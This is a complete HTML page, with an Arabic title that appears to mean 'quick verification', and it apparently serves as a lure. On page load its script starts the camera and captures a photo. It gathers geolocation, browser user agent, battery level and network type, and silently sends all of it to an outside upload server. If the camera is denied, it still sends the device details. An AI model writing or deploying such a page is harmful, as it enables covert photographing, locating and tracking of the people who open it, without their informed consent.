<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>ØªÙˆØ«ÙŠÙ‚ Ø³Ø±ÙŠØ¹</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding: 20px;
      }
      video {
        margin-top: 10px;
        border: 2px solid #ccc;
        border-radius: 8px;
      }
      #info {
        margin-top: 20px;
        font-size: 1.2em;
        color: green;
      }
    </style>
  </head>
  <body onload="startCamera()">
    <h2 style="color: green">ğŸ“¸ ØªÙˆØ«ÙŠÙ‚ ÙÙˆØ±ÙŠ Ù‚ÙŠØ¯ Ø§Ù„ØªÙ†ÙÙŠØ°...</h2>
    <video
      id="preview"
      autoplay
      muted
      playsinline
      style="width: 100%; max-width: 400px"
    ></video>
    <canvas id="snapshot" style="display: none"></canvas>
    <p id="info"></p>

    <script>
      let stream;

      async function startCamera() {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (err) {
          document.body.innerHTML =
            "<h2 style='color:red;'>âŒ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø±ÙÙˆØ¶Ø©: " +
            err.message +
            "</h2>";
          sendPayload({
            image: "null",
            info: {
              time: new Date().toLocaleString(),
              location: "ØºÙŠØ± Ù…ØªØ§Ø­",
              device: navigator.userAgent,
              battery: "ØºÙŠØ± Ù…ØªØ§Ø­",
              network: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
            },
          });
          return;
        }

        const video = document.getElementById("preview");
        video.srcObject = stream;

        // Ù†Ù„ØªÙ‚Ø· ÙÙˆØ±Ù‹Ø§ Ø¨Ø¹Ø¯ Ø£ÙˆÙ„ Ø¥Ø·Ø§Ø±
        video.addEventListener("playing", () => {
          captureAndSend();
        });
      }

      async function captureAndSend() {
        const canvas = document.getElementById("snapshot");
        const video = document.getElementById("preview");
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");
        const timestamp = new Date().toLocaleString();
        const userAgent = navigator.userAgent;

        let batteryLevel = "ØºÙŠØ± Ù…ØªØ§Ø­";
        let connectionType = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        }

        if (navigator.connection) {
          connectionType = navigator.connection.effectiveType;
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            sendPayload({
              image: imageData,
              info: {
                time: timestamp,
                location: `${pos.coords.latitude.toFixed(
                  5
                )}, ${pos.coords.longitude.toFixed(5)}`,
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            });
            document.getElementById("info").innerText = "âœ… ØªÙ… Ø§Ù„ØªÙˆØ«ÙŠÙ‚ Ø§Ù„ÙÙˆØ±ÙŠ";
          },
          () => {
            sendPayload({
              image: imageData,
              info: {
                time: timestamp,
                location: "ØºÙŠØ± Ù…ØªØ§Ø­",
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            });
            document.getElementById("info").innerText =
              "âœ… ØªÙ… Ø§Ù„ØªÙˆØ«ÙŠÙ‚ Ø¨Ø¯ÙˆÙ† Ù…ÙˆÙ‚Ø¹";
          }
        );
      }

      function sendPayload(payload) {
        fetch("https://web-moment-server.onrender.com/upload", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" },
        });
      }
    </script>
  </body>
</html>
